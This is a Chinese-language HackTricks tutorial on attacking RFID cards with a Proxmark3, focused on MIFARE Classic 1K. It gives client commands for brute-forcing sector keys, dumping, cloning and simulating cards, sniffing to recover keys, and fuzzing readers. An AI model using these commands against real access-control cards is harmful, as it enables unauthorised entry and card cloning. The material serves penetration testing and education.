# Proxmark 3

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？ 想要在HackTricks中看到您的**公司广告**？ 或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在**Twitter**上**关注**我 **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧**。

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快修复。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 使用Proxmark3攻击RFID系统

首先，您需要拥有[**Proxmark3**](https://proxmark.com)并[**安装软件及其依赖项**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)。

### 攻击MIFARE Classic 1KB

它有**16个扇区**，每个扇区有**4个块**，每个块包含**16字节**。 UID位于扇区0块0中（不可更改）。
要访问每个扇区，您需要**2个密钥**（**A**和**B**），这些密钥存储在**每个扇区的块3中**（扇区尾部）。 扇区尾部还存储了**访问位**，使用这2个密钥可以授予对**每个块的读取和写入**权限。
如果您知道第一个密钥，则可以使用2个密钥来授予读取权限，如果您知道第二个密钥，则可以授予写入权限（例如）。

可以执行多种攻击。
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 允许执行其他操作，如**窃听** **标签到读卡器的通信**，以尝试找到敏感数据。在这张卡上，您可以仅仅通过嗅探通信并计算使用的密钥，因为使用的**加密操作较弱**，知道明文和密文后，您可以计算出来（`mfkey64` 工具）。

### 原始命令

物联网系统有时使用**非品牌或非商业标签**。在这种情况下，您可以使用 Proxmark3 向标签发送自定义**原始命令**。
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
使用这些信息，您可以尝试搜索有关卡片和与之通信方式的信息。Proxmark3允许发送原始命令，例如：`hf 14a raw -p -b 7 26`

### 脚本

Proxmark3软件预装了一系列**自动化脚本**，可用于执行简单任务。要检索完整列表，请使用`script list`命令。然后，使用`script run`命令，后跟脚本的名称：
```
proxmark3> script run mfkeys
```
您可以创建一个脚本来**模糊标签读卡器**，通过复制**有效卡**的数据，编写一个**Lua脚本**来**随机化**一个或多个随机**字节**，并检查**读卡器**在任何迭代中是否崩溃。

找到最重要的漏洞，以便更快修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks) 今天。
